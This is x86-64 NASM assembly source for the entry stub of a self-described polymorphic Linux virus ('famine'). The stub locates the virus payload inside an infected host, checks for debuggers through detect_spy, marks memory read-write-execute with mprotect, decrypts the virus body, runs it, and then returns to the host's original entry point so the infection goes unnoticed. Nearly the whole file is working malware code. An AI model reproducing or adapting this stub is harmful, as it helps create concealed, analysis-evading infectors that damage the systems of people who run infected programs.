
%define SYSCALL_WRITE		0x01
%define SYSCALL_EXIT		0x3c
%define SYSCALL_MPROTECT	0x0a
%define STDOUT			0x01
%define PROT_RWX		0x07
%define CALL_INSTR_SIZE		0x05
%define SYSCALL_FORK		0x39

section .text
	global famine_entry
	global mark_below
	global _start
	global mprotect_call
	global mprotect_end
	global return_to_client

	global mprotect_call
	global mprotect_end
extern detect_spy
extern decypher
extern virus

famine_entry:
;------------------------------; Store variables
	call mark_below
	db "polymorphic seed", "rel ptld", "ptldsize", "relvirus"
	db "relentry", "virusize"
	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
;------------------------------; Get variables address
; | 0    | *(16)       | *24         | *(32)       | *(40)        | *48        |
; | rdx  | r8          | r9          | r10         | r11          | r14        |
; | seed | rel ptld    | ptld size   | rel virus   | rel entry    | virus size |
; | seed | (ptld addr) | (ptld size) | (virus addr)| (entry addr) |(virus size)|
mark_below:
	pop rax
	push rdx                   ; backup rdx
	push r14                   ; backup r14

	mov rdx, rax

	mov r8, rdx
	mov r9, rdx
	mov r10, rdx
	mov r11, rdx
	mov r14, rdx
	add r8, 16                 ; align vars to correct addresses
	add r9, 24
	add r10, 32
	add r11, 40
	add r14, 48
	mov r8, [r8]               ; dereference vars
	mov r9, [r9]
	mov r10, [r10]
	mov r11, [r11]
	mov r14, [r14]

	mov rax, rdx               ; get famine_entry addr
	sub rax, CALL_INSTR_SIZE

	push r15                   ; backup r15
	mov r15, rax
	xchg r15, r8
	sub r8, r15                ; r8 = rax - r8
	mov r15, rax
	xchg r15, r10
	add r10, r15               ; r10 = rax + r10
	mov r15, rax
	xchg r15, r11
	sub r11, r15               ; r11 = rax - r11
	pop r15                    ; restore r15

	push rax                   ; save famine_entry  [rsp + 40]
	push r8                    ; save ptld addr     [rsp + 32]
	push r9                    ; save ptld size     [rsp + 24]
	push r10                   ; save virus addr    [rsp + 16]
	push r11                   ; save entry addr    [rsp + 8]
	push rdx                   ; save seed          [rsp]
;------------------------------; Show-off
%ifdef DEBUG
	mov rax, 0x00000a2e2e2e2e59
	push rax
	mov rax, 0x444f4f572e2e2e2e
	push rax

	; write(1, "....WOODY....\n", 14);
	mov rdi, STDOUT
	mov rsi, rsp
	mov rdx, 14
	mov rax, SYSCALL_WRITE
	syscall

	add rsp, 16
%endif
;------------------------------; check if client behaves well (comment for debug)
	call detect_spy
	test rax, rax
	jnz return_to_client
;------------------------------; make ptld writable
mprotect_call:
	mov r8, [rsp + 32]         ; get ptld addr
	mov r9, [rsp + 24]         ; get ptld len

	;mprotect(ptld_addr, ptld_size, PROT_READ | PROT_WRITE | PROT_EXEC);

	mov rdi, r8
	mov rsi, r9
	mov rdx, PROT_RWX
	mov rax, SYSCALL_MPROTECT
	syscall
mprotect_end:
;------------------------------; decypher virus
	mov rdi, [rsp + 16]        ; get virus_addr
	mov rsi, r14               ; get virus_size

	call decypher
;------------------------------; launch virus
	mov rdi, [rsp]             ; get seed
	call virus
;------------------------------; return to client entry
return_to_client:
	mov r11, [rsp + 8]         ; get entry addr
	add rsp, 48                ; restore stack as it was
	pop r14                    ; restore r14
	pop rdx                    ; restore rdx
	push r11
	ret
